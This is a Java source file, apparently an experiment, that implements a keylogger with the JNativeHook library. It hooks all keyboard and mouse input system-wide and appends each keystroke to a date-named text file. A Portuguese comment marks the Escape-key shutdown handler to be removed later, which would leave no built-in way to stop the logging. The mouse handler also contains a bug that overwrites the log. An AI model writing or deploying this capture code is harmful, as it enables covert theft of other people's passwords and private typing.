package testes;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JOptionPane;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.mouse.NativeMouseEvent;
import org.jnativehook.mouse.NativeMouseListener;

public class NovoClass5 implements NativeKeyListener, NativeMouseListener {

    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        } catch (Exception e) {
            e.printStackTrace();
        }
        GlobalScreen.addNativeKeyListener(new NovoClass5());
        GlobalScreen.addNativeMouseListener(new NovoClass5());
    }

    boolean clicar;
    boolean teclou;
    
    Date data = new Date();
        SimpleDateFormat fd = new SimpleDateFormat("dd-MM-yyyy");
        String fdd = fd.format(data);
        Date hora = new Date();
        SimpleDateFormat fh = new SimpleDateFormat("HH:mm:ss");
        String fhh = fh.format(hora);

    public void nativeKeyPressed(NativeKeyEvent nke) {

        
        String dados = NativeKeyEvent.getKeyText(nke.getKeyCode());

        try (BufferedWriter arquivo = new BufferedWriter(new FileWriter(fdd + ".txt", true))) {

            if (clicar == true||teclou==true) {
            }

            //TIRAR ISSO AQUI EM BAIXO DEPOIS//
            if (nke.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
                try {
                    //System.exit(1);
                    GlobalScreen.unregisterNativeHook();
                    //TIRAR ISSO AQUI EM CIMA DEPOIS//
                } catch (NativeHookException ex) {
                    JOptionPane.showMessageDialog(null, ex.getMessage());
                }
            } else if (nke.getKeyCode() == NativeKeyEvent.VC_ENTER) {
                arquivo.newLine();
            } else if (nke.getKeyCode() == NativeKeyEvent.VC_CAPS_LOCK) {
            } else if (nke.getKeyCode() == NativeKeyEvent.VC_SPACE) {
                arquivo.write(" ");
            } else if (true) {
                arquivo.write(dados);
                arquivo.flush();
                teclou = false;
            }

        } catch (IOException ex) {
            JOptionPane.showMessageDialog(null, ex.getMessage());
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {
    }

    ////////----------- MOUSE -----------////////

    public void nativeMouseClicked(NativeMouseEvent nme) {
        try{
        BufferedWriter writer = new BufferedWriter(new FileWriter(new File(fdd+".txt")));
        writer.newLine();
        writer.write(fhh);
        writer.newLine();
        writer.flush();
        } catch (IOException ex) {
            System.out.println(ex.getMessage());
        }
        clicar = true;
    }

    @Override
    public void nativeMousePressed(NativeMouseEvent nme) {
    }

    @Override
    public void nativeMouseReleased(NativeMouseEvent nme) {
    }

}
